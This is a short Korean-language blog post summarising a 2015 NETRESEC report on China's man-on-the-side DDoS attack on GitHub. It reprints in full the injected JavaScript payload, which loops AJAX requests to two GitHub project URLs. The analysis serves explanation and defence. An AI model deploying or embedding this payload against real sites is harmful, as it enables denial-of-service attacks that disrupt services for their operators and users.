---
layout: post
title: "China's Man-on-the-Side Attack on GitHub"
date: 2015-04-06 17:08:17 +0900
comments: true
categories: 
---

NETRESEC 블로그에 올라온 글. 중국이 GitHub 에 정치적인 목적으로 DDoS 를 가했다고. 
중국정부인지 해커인지는 모르겠지만 China Unicom 에 설치된 packet injector 에서 baidu 에서 호스팅하는 web analytics 의 js 를 요청하는 http 를 hijack 해서 ddos 를 가하는 js 를 인젝트했다고 한다. 

`2E3 == 2000` 이니까 2 초마다 `https://github.com/greatfire` 와 `https://github.com/cn-nytimes` 중에 하나를 골라서 AJAX 로 request 한다.

* [NETRESEC Blog](http://www.netresec.com/?page=Blog&month=2015-03&post=China%27s-Man-on-the-Side-Attack-on-GitHub)

``` javascript 인젝트된 코드
document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'>\x3c/script>");
!window.jQuery && document.write("<script src='http://code.jquery.com/jquery-latest.js'>\x3c/script>");
startime = (new Date).getTime();
var count = 0;

function unixtime() {
    var a = new Date;
    return Date.UTC(a.getFullYear(), a.getMonth(), a.getDay(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1E3
}
url_array = ["https://github.com/greatfire", "https://github.com/cn-nytimes"];
NUM = url_array.length;

function r_send2() {
    var a = unixtime() % NUM;
    get(url_array[a])
}

function get(a) {
    var b;
    $.ajax({
        url: a,
        dataType: "script",
        timeout: 1E4,
        cache: !0,
        beforeSend: function() {
            requestTime = (new Date).getTime()
        },
        complete: function() {
            responseTime = (new Date).getTime();
            b = Math.floor(responseTime - requestTime);
            3E5 > responseTime - startime && (r_send(b), count += 1)
        }
    })
}

function r_send(a) {
    setTimeout("r_send2()", a)
}
setTimeout("r_send2()", 2E3);
```
